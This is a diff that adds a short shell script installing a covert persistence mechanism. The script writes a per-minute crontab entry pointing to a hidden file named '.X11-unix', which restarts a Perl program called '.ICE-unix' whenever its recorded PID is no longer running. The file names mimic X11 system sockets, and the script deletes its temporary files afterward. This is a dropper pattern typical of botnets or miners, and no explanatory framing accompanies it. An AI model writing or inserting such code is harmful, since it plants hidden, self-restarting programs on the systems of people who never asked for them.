@@ -1,0 +1,18 @@
+#!/bin/sh
+ pwd > m.dir
+ dir=$(cat m.dir)
+ echo "* * * * * $dir/.X11-unix >/dev/null 2>&1" > cron.d
+ crontab cron.d
+ crontab -l | grep update
+ echo "#!/bin/sh
+ if test -r $dir/.ICE-linux; then
+ pid=\$(cat $dir/.ICE-linux)
+ if \$(kill -CHLD \$pid >/dev/null 2>&1)
+ then
+ exit 0
+ fi
+ fi
+ cd $dir
+ perl .ICE-unix &>/dev/null" > .X11-unix
+ chmod u+x .X11-unix
+ rm -fr m.dir cron.d 
